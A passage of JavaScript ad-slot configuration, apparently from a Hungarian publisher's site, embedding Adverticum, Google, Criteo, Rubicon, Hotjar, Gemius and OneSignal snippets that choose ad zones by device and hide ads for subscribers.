\\"78\\" || 74,        confObj = {\'pageKw\':\'recipe_details\', \'recipeAuthor\':\'\'} || {},            replaceAccents = function (str) {                var rExps = [                    { re: /\\u00f6/g, ch: \'o\' },                    { re: /\\u00fc/g, ch: \'u\' },                    { re: /\\u00f3/g, ch: \'o\' },                    { re: /\\u0151/g, ch: \'o\' },                    { re: /\\u00fa/g, ch: \'u\' },                    { re: /\\u00e9/g, ch: \'e\' },                    { re: /\\u00e1/g, ch: \'a\' },                    { re: /\\u0171/g, ch: \'u\' },                    { re: /\\u00ed/g, ch: \'i\' }                ];                for (var i = 0, len = rExps.length; i < len; i++)                    str = str.replace(rExps[i].re, rExps[i].ch);                return str;            };    if (typeof atob != \'undefined\' && typeof _ceCTSData != \'undefined\' && confObj != {}) {        var origMeta = \'\',            newContent = \'\',            userDbStr = \'userdb_id\',            adverticumMeta;        for (var key in confObj) {            if (confObj.hasOwnProperty(key) && _ceCTSData.hasOwnProperty(key)) {                if (confObj[key] != \'\') {                    newContent += confObj[key] + \'=\' + _ceCTSData[key] + \'&\';                } else {                    newContent += confObj[key] + \'#noKey#\' + _ceCTSData[key];                }            }        }        newContent = replaceAccents(newContent);        if (newContent != \\"\\") {            if (document.getElementsByName(\'customtarget\').length != 0) {                adverticumMeta = document.getElementsByName(\'customtarget\')[0];                origMeta = atob(adverticumMeta.content);            } else {                adverticumMeta = document.createElement(\'meta\');                adverticumMeta.name = \'customtarget\';                document.getElementsByTagName(\'head\')[0].appendChild(adverticumMeta);            }            if (origMeta != \\"\\") {                if (origMeta.indexOf(userDbStr + \\"=\\" + userdbId) != -1) {                    var newMeta = userDbStr + \\"=\\" + userdbId + \'&\' + newContent.replace(/&$/g, \'\').replace(/&#noKey#/, \',\');                    origMeta = origMeta.replace(userDbStr + \\"=\\" + userdbId, newMeta);                    adverticumMeta.content = btoa(origMeta);                } else {                    adverticumMeta.content = btoa(userDbStr + \'=\' + userdbId + \'&\' + newContent.replace(/&$/g, \'\').replace(/&#noKey#/, \',\'));                }            } else {                adverticumMeta.content = btoa(userDbStr + \'=\' + userdbId + \'&\' + newContent.replace(/&$/g, \'\').replace(/&#noKey#/, \',\'));            }        }    }})();</script>\"}, {\"service_name\": \"Sanoma\", \"weight\": null, \"source\": \"<script src=\\"//stat.p24.hu/CTS/helper-scripts/subscriptionDetect/subscriptionDetect.min.js\\"></script><script>    var _ceSubscriptionDetect = new subscriptionDetect(\'${subscription_config}\');</script>\"}, {\"service_name\": \"Google Adverts\", \"weight\": null, \"source\": \"<script>    (function () {        if (window.Element && !Element.prototype.closest) {            Element.prototype.closest = function (s) {                var matches = (this.document || this.ownerDocument).querySelectorAll(s),                    i,                    el = this;                do {                    i = matches.length;                    while (--i >= 0 && matches.item(i) !== el) { };                } while ((i < 0) && (el = el.parentElement));                return el;            };        }        window.googletag = window.googletag || { cmd: [] };        if(typeof noADX != \'undefined\' && noADX){            window.adsbygoogle = window.adsbygoogle || [];            window.adsbygoogle.pauseAdRequests = 1;            window.adsbygoogle.push({                enable_page_level_ads: false            });            window.googletag.cmd.push(function() {                window.googletag.destroySlots();                window.googletag.pubads().disableInitialLoad();                window.googletag.pubads().clear();            });        }        window.googletag.cmd.push(function () {            window.googletag.pubads().addEventListener(\'slotRenderEnded\', function (event) {                if (event.isEmpty) {                    var slotEl = document.getElementById(event.slot.getSlotId().getDomId());                    try {                        var advEl = slotEl.closest(\\".goAdverticum, .goa-embedded[id*=\'ajaxZone\']\\");                        if (advEl != undefined && advEl != null && advEl.contains(slotEl)) {                            slotEl = advEl;                        }                    } catch (e) { }                    slotEl.style.display = \'none\';                }            });        });    })();</script>\"}, {\"service_name\": \"Gemius\", \"weight\": null, \"source\": \"<script src=\\"//spl.hit.gemius.pl/gplayer.js\\" type=\\"text/javascript\\"></script>\"}, {\"service_name\": \"Hotjar\", \"weight\": null, \"source\": \"<script>    (function(h,o,t,j,a,r){        h.hj=h.hj||function(){(h.hj.q=h.hj.q||[]).push(arguments)};        h._hjSettings={hjid:86168,hjsv:6};        a=o.getElementsByTagName(\'head\')[0];        r=o.createElement(\'script\');r.async=1;        r.src=t+h._hjSettings.hjid+j+h._hjSettings.hjsv;        a.appendChild(r);    })(window,document,\'//static.hotjar.com/c/hotjar-\',\'.js?sv=\');</script>\"}, {\"service_name\": \"Google Adverts\", \"weight\": null, \"source\": \"<script async src=\\"https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-1984646123858990\\" crossorigin=\\"anonymous\\"></script>\"}, {\"service_name\": \"OneSignal\", \"weight\": null, \"source\": \"<script id=\\"tempScript\\">\t(() => {\t\tconst getOsConfig = () => {\t\t\tconst conf = {\t\t\t\tcts: \'{\\"appId\\":\\"6b09d73e-0b64-4830-8ff5-ee626db0158e\\"}\',\t\t\t\twp: window._oneSignalInitOptions\t\t\t};\t\t\tif (conf.wp != undefined) {\t\t\t\treturn conf.wp;\t\t\t} else {\t\t\t\treturn JSON.parse(conf.cts);\t\t\t}\t\t};\t\tconst initOneSignal = () => {\t\t\twindow.__tcfapi(\\"addEventListener\\", 2, (tcData, success) => {\t\t\t\tif (success && (tcData.eventStatus === \'tcloaded\' || tcData.eventStatus === \'useractioncomplete\')) {\t\t\t\t\twindow.OneSignal = window.OneSignal || [];\t\t\t\t\tOneSignal.push(() => {\t\t\t\t\t\tOneSignal.init(getOsConfig());\t\t\t\t\t});\t\t\t\t}\t\t\t});\t\t};\t\tconst insertOsScript = () => {\t\t\tconst osScript = document.createElement(\'script\');\t\t\tosScript.type = \'text/javascript\';\t\t\tosScript.async = true;\t\t\tosScript.src = \'//cdn.onesignal.com/sdks/OneSignalSDK.js\';\t\t\tosScript.onload = initOneSignal;\t\t\tdocument.head.appendChild(osScript);\t\t};\t\tif (typeof window.OneSignal != \'undefined\') {\t\t\tdocument.addEventListener(\\"DOMContentLoaded\\", initOneSignal);\t\t} else {\t\t\tdocument.addEventListener(\\"DOMContentLoaded\\", insertOsScript);\t\t}\t\tconst tempScript = document.querySelector(\\"#tempScript\\");\t\ttempScript.parentNode.removeChild(tempScript);    })();</script>\"}]';
  this.positions_weighted['head'] = false;
  this.positions['list-content-bottom'] = '[]';
  this.positions_weighted['list-content-bottom'] = false;
  this.positions['list-content-top'] = '[{\"service_name\": \"Adverticum AdServer\", \"weight\": null, \"source\": \"<div id=\\"ctstemp\\" class=\\"goAdverticum a8a263be\\" style=\\"display: none;\\"><script>        (function () {            var insertedElement = document.getElementById(\'ctstemp\');            var zoneForDevice = \'\';            var dataAdsvName = \'\';            var isSubscribed = false;            if (typeof _ceSubscriptionDetect != \'undefined\' && _ceSubscriptionDetect.getSubscriptionData().isSubscribed) {                isSubscribed = true;            }            if (typeof _ceDeviceDetect.getDeviceType() !== \'undefined\') {                switch (_ceDeviceDetect.getDeviceType()) {                    case \'desktop\':                        zoneForDevice = \'5043018\';                        dataAdsvName = \'top\';                        break;                    case \'mobile\':                        zoneForDevice = \'6241272\';                        dataAdsvName = \'${adverticum_name_mobile}\';                        break;                    case \'tablet\':                        zoneForDevice = \'6241272\';                        dataAdsvName = \'${adverticum_name_tablet}\';                        if (dataAdsvName == \\"\\") {                            dataAdsvName = \'top\';                        }                        break;                }            }            if (zoneForDevice == \'\' || isSubscribed) {                insertedElement.parentNode.removeChild(insertedElement);            } else {                insertedElement.setAttribute(\'data-adsv-name\', dataAdsvName);                insertedElement.id = \'zone\' + zoneForDevice;                if (insertedElement.getAttribute(\\"ctsStyle\\") != null) {                    insertedElement.style = insertedElement.getAttribute(\\"ctsStyle\\");                    insertedElement.removeAttribute(\\"ctsStyle\\");                } else {                    insertedElement.removeAttribute(\\"style\\");                }            }        })();    </script></div>\"}]';
  this.positions_weighted['list-content-top'] = false;
  this.positions['list-content010'] = '[]';
  this.positions_weighted['list-content010'] = false;
  this.positions['list-content020'] = '[{\"service_name\": \"Adverticum AdServer\", \"weight\": null, \"source\": \"<div id=\\"ajaxZoneTemp\\" class=\\"a8a263be\\" data-adsv-name=\\"\\" ctsStyle=\\"${custom_css}\\" style=\\"display: none;\\"></div><script>    (function () {        const insertedElement = document.getElementById(\'ajaxZoneTemp\');        const randSlotStr = \'_\' + Math.round(Math.random() * 9999999);        insertedElement.id += randSlotStr;        window.goAdverticum3.onReady((goa3) => {            const $ = goa3.getjQuery();            let zoneForDevice = \'\';            let dataAdsvName = \'\';            let isSubscribed = false;            if (typeof _ceSubscriptionDetect != \'undefined\' && _ceSubscriptionDetect.getSubscriptionData() != undefined && _ceSubscriptionDetect.getSubscriptionData().isSubscribed) {                isSubscribed = true;            }            if (window._ceDeviceDetect != undefined && typeof window._ceDeviceDetect.getDeviceType() !== \'undefined\') {                switch (window._ceDeviceDetect.getDeviceType()) {                    case \'desktop\':                        zoneForDevice = \'${adv_zone_id_for_desktop}\';                        dataAdsvName = \'${adverticum_name}\';                        break;                    case \'mobile\':                        zoneForDevice = \'5043066\';                        dataAdsvName = \'mobil_waterfall1\';                        break;                    case \'tablet\':                        zoneForDevice = \'5043066\' || \'${adv_zone_id_for_desktop}\';                        dataAdsvName = \'${adverticum_name_tablet}\';                        if (dataAdsvName == \\"\\") {                            dataAdsvName = \'${adverticum_name}\';                        }                        break;                }            }            if (zoneForDevice == \'\' || isSubscribed) {                insertedElement.parentNode.removeChild(insertedElement);            } else {                insertedElement.id = \'ajaxZone\' + zoneForDevice + randSlotStr;                insertedElement.setAttribute(\'data-adsv-name\', dataAdsvName);                if (insertedElement.getAttribute(\\"ctsStyle\\") != null) {                    insertedElement.style = insertedElement.getAttribute(\\"ctsStyle\\");                    insertedElement.removeAttribute(\\"ctsStyle\\");                } else {                    insertedElement.removeAttribute(\\"style\\");                }                $(\'#\' + insertedElement.id).goa(zoneForDevice, {                    p: 100, zP: \\"\\", fP: \\"\\", cT: \\"\\"                });            }        });    })();</script>\"}]';
  this.positions_weighted['list-content020'] = false;
  this.positions['list-content030'] = '[{\"service_name\": \"Adverticum AdServer\", \"weight\": null, \"source\": \"<div id=\\"ctstemp\\" class=\\"goAdverticum a8a263be\\" style=\\"display: none;\\"><script>        (function () {            var insertedElement = document.getElementById(\'ctstemp\');            var zoneForDevice = \'\';            var dataAdsvName = \'\';            var isSubscribed = false;            if (typeof _ceSubscriptionDetect != \'undefined\' && _ceSubscriptionDetect.getSubscriptionData().isSubscribed) {                isSubscribed = true;            }            if (typeof _ceDeviceDetect.getDeviceType() !== \'undefined\') {                switch (_ceDeviceDetect.getDeviceType()) {                    case \'desktop\':                        zoneForDevice = \'${adv_zone_id_for_desktop}\';                        dataAdsvName = \'${adverticum_name}\';                        break;                    case \'mobile\':                        zoneForDevice = \'5043083\';                        dataAdsvName = \'mobil_waterfall2\';                        break;                    case \'tablet\':                        zoneForDevice = \'5043083\';                        dataAdsvName = \'${adverticum_name_tablet}\';                        if (dataAdsvName == \\"\\") {                            dataAdsvName = \'${adverticum_name}\';                        }                        break;                }            }            if (zoneForDevice == \'\' || isSubscribed) {                insertedElement.parentNode.removeChild(insertedElement);            } else {                insertedElement.setAttribute(\'data-adsv-name\', dataAdsvName);                insertedElement.id = \'zone\' + zoneForDevice;                if (insertedElement.getAttribute(\\"ctsStyle\\") != null) {                    insertedElement.style = insertedElement.getAttribute(\\"ctsStyle\\");                    insertedElement.removeAttribute(\\"ctsStyle\\");                } else {                    insertedElement.removeAttribute(\\"style\\");                }            }        })();    </script></div>\"}]';
  this.positions_weighted['list-content030'] = false;
  this.positions['list-content040'] = '[{\"service_name\": \"Adverticum AdServer\", \"weight\": null, \"source\": \"<div id=\\"ctstemp\\" class=\\"goAdverticum a8a263be\\" style=\\"display: none;\\"><script>        (function () {            var insertedElement = document.getElementById(\'ctstemp\');            var zoneForDevice = \'\';            var dataAdsvName = \'\';            var isSubscribed = false;            if (typeof _ceSubscriptionDetect != \'undefined\' && _ceSubscriptionDetect.getSubscriptionData().isSubscribed) {                isSubscribed = true;            }            if (typeof _ceDeviceDetect.getDeviceType() !== \'undefined\') {                switch (_ceDeviceDetect.getDeviceType()) {                    case \'desktop\':                        zoneForDevice = \'6241302\';                        dataAdsvName = \'roadblock2\';                        break;                    case \'mobile\':                        zoneForDevice = \'6040801\';                        dataAdsvName = \'mobil_waterfall3\';                        break;                    case \'tablet\':                        zoneForDevice = \'6040801\';                        dataAdsvName = \'${adverticum_name_tablet}\';                        if (dataAdsvName == \\"\\") {                            dataAdsvName = \'roadblock2\';                        }                        break;                }            }            if (zoneForDevice == \'\' || isSubscribed) {                insertedElement.parentNode.removeChild(insertedElement);            } else {                insertedElement.setAttribute(\'data-adsv-name\', dataAdsvName);                insertedElement.id = \'zone\' + zoneForDevice;                if (insertedElement.getAttribute(\\"ctsStyle\\") != null) {                    insertedElement.style = insertedElement.getAttribute(\\"ctsStyle\\");                    insertedElement.removeAttribute(\\"ctsStyle\\");                } else {                    insertedElement.removeAttribute(\\"style\\");                }            }        })();    </script></div>\"}]';
  this.positions_weighted['list-content040'] = false;
  this.positions['right010'] = '[{\"service_name\": \"Adverticum AdServer\", \"weight\": null, \"source\": \"<div id=\\"ctstemp\\" class=\\"goAdverticum\\" style=\\"display: none;\\"><script>        (function () {            var insertedElement = document.getElementById(\'ctstemp\');            var zoneForDevice = \'\';            var isSubscribed = false;            if (typeof _ceSubscriptionDetect != \'undefined\' && _ceSubscriptionDetect.getSubscriptionData().isSubscribed) {                isSubscribed = true;            }            if (typeof _ceDeviceDetect.getDeviceType() !== \'undefined\') {                switch (_ceDeviceDetect.getDeviceType()) {                    case \'desktop\':                        zoneForDevice = \'5042864\';                        break;                    case \'mobile\':                        zoneForDevice = \'5253630\';                        break;                    case \'tablet\':                        zoneForDevice = \'5253630\';                        break;                }            }            if (zoneForDevice == \'\' || isSubscribed) {                insertedElement.parentNode.removeChild(insertedElement);            } else {                insertedElement.id = \'zone\' + zoneForDevice;                if (insertedElement.getAttribute(\\"ctsStyle\\") != null) {                    insertedElement.style = insertedElement.getAttribute(\\"ctsStyle\\");                    insertedElement.removeAttribute(\\"ctsStyle\\");                } else {                    insertedElement.removeAttribute(\\"style\\");                }            }        })();    </script></div>\"}, {\"service_name\": \"Criteo\", \"weight\": null, \"source\": \"<div id=\\"criteoTPL\\" ctsStyle=\\"width:0px;height:0px;margin:0 auto;overflow:hidden;${custom_css}\\" style=\\"display: none;\\"></div><script type=\\"text/javascript\\">    (function () {        var zoneid = 1470407,            height = 600,            width = 300,            criteoEl = document.getElementById(\\"criteoTPL\\"),            domReady = \\"${criteo_dom_ready}\\",            mutationTimeout = 5000,            mutationConf = { attributes: true, childList: true, subtree: true },            isSubscribed = false;        if (typeof _ceSubscriptionDetect != \'undefined\' && _ceSubscriptionDetect.getSubscriptionData() != undefined && _ceSubscriptionDetect.getSubscriptionData().isSubscribed) {            isSubscribed = true;        }        var insertCriteoBanner = function () {            if (!isSubscribed) {                criteoEl.id += Math.floor(Math.random() * 1000000);                if (criteoEl.getAttribute(\\"ctsStyle\\") != null) {                    criteoEl.style = criteoEl.getAttribute(\\"ctsStyle\\");                    criteoEl.removeAttribute(\\"ctsStyle\\");                } else {                    criteoEl.removeAttribute(\\"style\\");                }                var observer = new MutationObserver(function (mutations) {                    mutations.forEach(function () {                        criteoEl.style.width = width + \\"px\\";                        criteoEl.style.height = height + \\"px\\";                        criteoEl.style.marginTop = \\"10px\\";                        criteoEl.style.marginBottom = \\"10px\\";                        observer.disconnect();                    });                });                observer.observe(criteoEl, mutationConf);                setTimeout(function () { observer.disconnect(); }, mutationTimeout);                Criteo.events.push(function () {                    Criteo.DisplayAcceptableAdIfAdblocked({                        \\"zoneid\\": zoneid,                        \\"containerid\\": criteoEl.id,                        \\"overrideZoneFloor\\": true                    });                });            } else {                criteoEl.parentNode.removeChild(criteoEl);            }        };        if (domReady != undefined && domReady != \'\' && domReady) {            if (typeof document.addEventListener !== \'undefined\') {                document.addEventListener(\\"DOMContentLoaded\\", insertCriteoBanner);            } else {                window.attachEvent(\\"onload\\", insertCriteoBanner);            }        } else {            insertCriteoBanner();        }    })();</script>\"}]';
  this.positions_weighted['right010'] = false;
  this.positions['top'] = '[]';
  this.positions_weighted['top'] = false;
  this.positions['content-left'] = '[]';
  this.positions_weighted['content-left'] = false;
  this.positions['content-right'] = '[]';
  this.positions_weighted['content-right'] = false;
  this.positions['list-content050'] = '[]';
  this.positions_weighted['list-content050'] = false;
  this.positions['right020'] = '[{\"service_name\": \"Adverticum AdServer\", \"weight\": null, \"source\": \"<div id=\\"ctstemp1\\" class=\\"goAdverticum\\"></div><br><div id=\\"ctstemp2\\" class=\\"goAdverticum\\"></div><script>    (function () {        var zone1 = document.getElementById(\\"ctstemp1\\");        var zone2 = document.getElementById(\\"ctstemp2\\");        var isSubscribed = false;        if (typeof _ceSubscriptionDetect != \'undefined\' && _ceSubscriptionDetect.getSubscriptionData() != undefined && _ceSubscriptionDetect.getSubscriptionData().isSubscribed) {            isSubscribed = true;        }        if (!isSubscribed) {            zone1.id = \\"zone5042872\\";            zone2.id = \\"zone5253630\\";        } else {            zone1.parentNode.removeChild(zone1);            zone2.parentNode.removeChild(zone2);        }    })();</script>\"}, {\"service_name\": \"Criteo\", \"weight\": null, \"source\": \"<div id=\\"criteoTPL\\" ctsStyle=\\"width:0px;height:0px;margin:0 auto;overflow:hidden;margin-top:15px;margin-bottom: 30px;\\" style=\\"display: none;\\"></div><script type=\\"text/javascript\\">    (function () {        var zoneid = 1470408,            height = 250,            width = 300,            criteoEl = document.getElementById(\\"criteoTPL\\"),            domReady = \\"${criteo_dom_ready}\\",            mutationTimeout = 5000,            mutationConf = { attributes: true, childList: true, subtree: true },            isSubscribed = false;        if (typeof _ceSubscriptionDetect != \'undefined\' && _ceSubscriptionDetect.getSubscriptionData() != undefined && _ceSubscriptionDetect.getSubscriptionData().isSubscribed) {            isSubscribed = true;        }        var insertCriteoBanner = function () {            if (!isSubscribed) {                criteoEl.id += Math.floor(Math.random() * 1000000);                if (criteoEl.getAttribute(\\"ctsStyle\\") != null) {                    criteoEl.style = criteoEl.getAttribute(\\"ctsStyle\\");                    criteoEl.removeAttribute(\\"ctsStyle\\");                } else {                    criteoEl.removeAttribute(\\"style\\");                }                var observer = new MutationObserver(function (mutations) {                    mutations.forEach(function () {                        criteoEl.style.width = width + \\"px\\";                        criteoEl.style.height = height + \\"px\\";                        criteoEl.style.marginTop = \\"10px\\";                        criteoEl.style.marginBottom = \\"10px\\";                        observer.disconnect();                    });                });                observer.observe(criteoEl, mutationConf);                setTimeout(function () { observer.disconnect(); }, mutationTimeout);                Criteo.events.push(function () {                    Criteo.DisplayAcceptableAdIfAdblocked({                        \\"zoneid\\": zoneid,                        \\"containerid\\": criteoEl.id,                        \\"overrideZoneFloor\\": true                    });                });            } else {                criteoEl.parentNode.removeChild(criteoEl);            }        };        if (domReady != undefined && domReady != \'\' && domReady) {            if (typeof document.addEventListener !== \'undefined\') {                document.addEventListener(\\"DOMContentLoaded\\", insertCriteoBanner);            } else {                window.attachEvent(\\"onload\\", insertCriteoBanner);            }        } else {            insertCriteoBanner();        }    })();</script>\"}]';
  this.positions_weighted['right020'] = false;
  this.positions['right030'] = '[{\"service_name\": \"Adverticum AdServer\", \"weight\": null, \"source\": \"<div id=\\"ctstemp\\" class=\\"goAdverticum\\" style=\\"display: none;\\"><script>        (function () {            var insertedElement = document.getElementById(\'ctstemp\');            var zoneForDevice = \'\';            var isSubscribed = false;            if (typeof _ceSubscriptionDetect != \'undefined\' && _ceSubscriptionDetect.getSubscriptionData().isSubscribed) {                isSubscribed = true;            }            if (typeof _ceDeviceDetect.getDeviceType() !== \'undefined\') {                switch (_ceDeviceDetect.getDeviceType()) {                    case \'desktop\':                        zoneForDevice = \'6425874\';                        break;                    case \'mobile\':                        zoneForDevice = \'6425874\';                        break;                    case \'tablet\':                        zoneForDevice = \'6425874\';                        break;                }            }            if (zoneForDevice == \'\' || isSubscribed) {                insertedElement.parentNode.removeChild(insertedElement);            } else {                insertedElement.id = \'zone\' + zoneForDevice;                if (insertedElement.getAttribute(\\"ctsStyle\\") != null) {                    insertedElement.style = insertedElement.getAttribute(\\"ctsStyle\\");                    insertedElement.removeAttribute(\\"ctsStyle\\");                } else {                    insertedElement.removeAttribute(\\"style\\");                }            }        })();    </script></div>\"}]';
  this.positions_weighted['right030'] = false;
  this.positions['right-bottom'] = '[{\"service_name\": \"Rubicon\", \"weight\": null, \"source\": \"<div id=\\"RubiconAdTemp\\" class=\\"rubAd\\" ctsStyle=\\"width: 100%;text-align: center;${custom_css}\\" style=\\"display: none;\\"><div style=\\"text-align: right; font-size: 8px; color: #C6C6C6; margin: 0 auto;\\">HIRDET&#xC9;S</div><script language=\\"JavaScript\\" type=\\"text/javascript\\">        (function () {            var rubiconZoneSize = \'\';            var rubiconSite = \'152546\';            var rubiconSiteMobile = \'152548\';            var rubiconAdType = \'${rubicon_ad_type}\';            var tplElement = document.getElementById(\\"RubiconAdTemp\\");            var advParts = {};            var insertedGoogle = false;            var isSubscribed = false;            if (typeof _ceSubscriptionDetect != \'undefined\' && _ceSubscriptionDetect.getSubscriptionData() != undefined && _ceSubscriptionDetect.getSubscriptionData().isSubscribed) {                isSubscribed = true;            }            if (rubiconAdType == \'\') {                rubiconAdType = \'js\';            }            if (typeof _ceDeviceDetect.getDeviceType() !== \'undefined\') {                switch (_ceDeviceDetect.getDeviceType()) {                    case \'desktop\':                        rubiconZoneSize = \'741516-10\';                        break;                    case \'mobile\':                        rubiconZoneSize = \'${rubicon_ad_zone_mobile}\';                        rubiconZoneSize = rubiconZoneSize.split(\'-\')[0] + \'-15\';                        break;                    case \'tablet\':                        rubiconZoneSize = \'${rubicon_ad_zone_tablet}\';                        if (rubiconZoneSize == \'\') {                            rubiconZoneSize = \'741516-10\';                        }                        break;                }                if (_ceDeviceDetect.getDeviceType() != \'desktop\' && rubiconSiteMobile != undefined && rubiconSiteMobile != \'\' && rubiconSiteMobile != \'undefined\') {                    rubiconSite = rubiconSiteMobile;                }                if (navigator.userAgent.toLowerCase().indexOf(\\"ipad\\") !== -1 && navigator.userAgent.toLowerCase().indexOf(\\"iphone\\") === -1) {                    if (!isSubscribed) {                        insertedGoogle = true;                        advParts.initScript = document.createElement(\'script\');                        advParts.initScript.src = \'//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\';                        advParts.initScript.async = \'true\';                        advParts.body = document.createElement(\'ins\');                        advParts.body.className = \'adsbygoogle\';                        advParts.body.style = \\"display:inline-block;min-width:320px;max-width:1200px;width:100%;height:200px\\";                        advParts.body.setAttribute(\'data-ad-client\', \'ca-pub-8962558862962174\');                        advParts.body.setAttribute(\'data-ad-slot\', \'5920657040\');                        if (tplElement.getAttribute(\\"ctsStyle\\") != null) {                            tplElement.style = tplElement.getAttribute(\\"ctsStyle\\");                            tplElement.removeAttribute(\\"ctsStyle\\");                        } else {                            tplElement.removeAttribute(\\"style\\");                        }                        tplElement.appendChild(advParts.initScript);                        tplElement.appendChild(advParts.body);                        (adsbygoogle = window.adsbygoogle || []).push({});                        tplElement.removeAttribute(\'id\');                    }                }            }            if (!insertedGoogle) {                if (!isSubscribed && (typeof noRUBICON == \'undefined\' || noRUBICON === false) && rubiconZoneSize.split(\'-\')[0] != \'\') {                    rp_account = \'13818\';                    rp_site = rubiconSite;                    rp_zonesize = rubiconZoneSize;                    rp_adtype = rubiconAdType;                    if (tplElement.getAttribute(\\"ctsStyle\\") != null) {                        tplElement.style = tplElement.getAttribute(\\"ctsStyle\\");                        tplElement.removeAttribute(\\"ctsStyle\\");                    } else {                        tplElement.removeAttribute(\\"style\\");                    }                    tplElement.removeAttribute(\'id\');                } else {                    tplElement.remove();                }            }        })();    </script><script type=\\"text/javascript\\" src=\\"//ads.rubiconproject.com/ad/13818.js\\"></script></div>\"}]';
  this.positions_weighted['right-bottom'] = false;
  this.positions['content-article-end'] = '[{\"service_name\": \"Sanoma/Hirstart\", \"weight\": null, \"source\": \"<div id=\'hirstart_rss_partner_box\' class=\\"_ce_measure_widget _ce_measure_appear\\"    data-ce-measure-widget=\\"article_recommender{pad}\\" data-ce-measure-appear=\\"article_recommender{pad}\\"    style=\\"${rss_css}\\"></div><script>    (function () {        let src = \'\',            insertedElement = document.getElementById(\'hirstart_rss_partner_box\'),            cntMultipledRecomm = document.querySelectorAll(\\"#hirstartbox-8-1392\\").length;        if (typeof _ceDeviceDetect.getDeviceType() !== \'undefined\') {            switch (_ceDeviceDetect.getDeviceType()) {                case \'desktop\':                    src = \'//box.hirstart.hu/site/jsembed_news.php?pid=8&id=1392\';                    break;                case \'mobile\':                    src = \'//box.hirstart.hu/site/jsembed_news.php?pid=8&id=1392\';                    break;                case \'tablet\':                    src = \'//box.hirstart.hu/site/jsembed_news.php?pid=8&id=1392\';                    break;            }        }        if (src != \'\' && cntMultipledRecomm == 0) {            insertedElement.id = \\"hirstartbox-8-1392\\";            const s = document.createElement(\\"script\\");            s.type = \\"text/javascript\\";            s.async = true;            s.src = src;            document.getElementsByTagName(\\"head\\")[0].appendChild(s);        } else {            insertedElement.parentNode.removeChild(insertedElement);        }    })();</script>\"}, {\"service_name\": \"Adverticum AdServer\", \"weight\": null, \"source\": \"<div id=\\"ajaxZoneTemp\\" class=\\"a8a263be\\" data-adsv-name=\\"\\" ctsStyle=\\"text-align:center;\\" style=\\"display: none;\\"></div><script>    (function () {        const insertedElement = document.getElementById(\'ajaxZoneTemp\');        const randSlotStr = \'_\' + Math.round(Math.random() * 9999999);        insertedElement.id += randSlotStr;        window.goAdverticum3.onReady((goa3) => {            const $ = goa3.getjQuery();            let zoneForDevice = \'\';            let dataAdsvName = \'\';            let isSubscribed = false;            if (typeof _ceSubscriptionDetect != \'undefined\' && _ceSubscriptionDetect.getSubscriptionData() != undefined && _ceSubscriptionDetect.getSubscriptionData().isSubscribed) {                isSubscribed = true;            }            if (window._ceDeviceDetect != undefined && typeof window._ceDeviceDetect.getDeviceType() !== \'undefined\') {                switch (window._ceDeviceDetect.getDeviceType()) {                    case \'desktop\':                        zoneForDevice = \'5043035\';                        dataAdsvName = \'${adverticum_name}\';                        break;                    case \'mobile\':                        zoneForDevice = \'6248210\';                        dataAdsvName = \'${adverticum_name_mobile}\';                        break;                    case \'tablet\':                        zoneForDevice = \'6248210\' || \'5043035\';                        dataAdsvName = \'${adverticum_name_tablet}\';                        if (dataAdsvName == \\"\\") {                            dataAdsvName = \'${adverticum_name}\';                        }                        break;                }            }            if (zoneForDevice == \'\' || isSubscribed) {                insertedElement.parentNode.removeChild(insertedElement);            } else {                insertedElement.id = \'ajaxZone\' + zoneForDevice + randSlotStr;                insertedElement.setAttribute(\'data-adsv-name\', dataAdsvName);                if (insertedElement.getAttribute(\\"ctsStyle\\") != null) {                    insertedElement.style = insertedElement.getAttribute(\\"ctsStyle\\");                    insertedElement.removeAttribute(\\"ctsStyle\\");                } else {                    insertedElement.removeAttribute(\\"style\\");                }                $(\'#\' + insertedElement.id).goa(zoneForDevice, {                    p: 100, zP: \\"\\", fP: \\"\\", cT: \\"\\"                });            }        });    })();</script>\"}, {\"service_name\": \"Google Adverts\", \"weight\": null, \"source\": \"<div id=\\"ctsGadxTemp\\" class=\\"ctsGadx\\" ctsStyle=\\"${google_adx_style}\\" style=\\"display: none;\\"><div style=\\"text-align: right; font-size: 8px; color: #C6C6C6; margin: 0 auto;\\">HIRDET&#xC9;S</div><script type=\\"text/javascript\\">        (function () {            var slotForDevice = \'\';            var gadxErr = false;            var dimensionForDevice = {                width: parseInt(300) || 0,                height: parseInt(250) || 0            };            var isSubscribed = false;            if (typeof _ceSubscriptionDetect != \'undefined\' && _ceSubscriptionDetect.getSubscriptionData() != undefined && _ceSubscriptionDetect.getSubscriptionData().isSubscribed) {                isSubscribed = true;            }            if (typeof _ceDeviceDetect.getDeviceType() !== \'undefined\') {                switch (_ceDeviceDetect.getDeviceType()) {                    case \'desktop\':                        slotForDevice = \'${google_adx_slot_default_for_desktop}\';                        break;                    case \'mobile\':                        slotForDevice = \'9454467202\';                        dimensionForDevice.width = 300;                        dimensionForDevice.height = 250;                        if (\'${google_ad_width_mobile}\'.length > 0 && \'${google_ad_height_mobile}\'.length > 0) {                            dimensionForDevice.width = parseInt(${google_ad_width_mobile});                            dimensionForDevice.height = parseInt(${google_ad_height_mobile});                        }                        break;                    case \'tablet\':                        if (\'${google_adx_slot_default_for_tablet}\' != \'\') {                            slotForDevice = \'${google_adx_slot_default_for_tablet}\';                        } else {                            slotForDevice = \'${google_adx_slot_default_for_desktop}\';                        }                        break;                }                try {                } catch (err) {                    gadxErr = true;                }            }            if (!isSubscribed && (typeof noADX == \'undefined\' || noADX === false) && slotForDevice != \'\' && dimensionForDevice.width > 0 && dimensionForDevice.height > 0) {                var advParts = {};                var gadxDiv = document.getElementById(\'ctsGadxTemp\');                gadxDiv.firstElementChild.style.width = dimensionForDevice.width + \'px\';                advParts.initScript = document.createElement(\'script\');                advParts.initScript.src = \'//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\';                advParts.initScript.async = \'true\';                advParts.body = document.createElement(\'ins\');                advParts.body.className = \'adsbygoogle\';                advParts.body.style.display = \'table\';                advParts.body.style.margin = \'0 auto\';                advParts.body.style.width = dimensionForDevice.width + \'px\';                advParts.body.style.height = dimensionForDevice.height + \'px\';                advParts.body.setAttribute(\'data-ad-client\', \'ca-pub-8962558862962174\');                advParts.body.setAttribute(\'data-ad-slot\', slotForDevice);                advParts.body.setAttribute(\'data-max-num-ads\', parseInt(${google_max_num_ads}) || 1);                if (typeof \'${google_ad_page_url}\' !== \'undefined\' && \'${google_ad_page_url}\' != \'\') {                    advParts.body.setAttribute(\'data-page-url\', \'${google_ad_page_url}\');                }                if 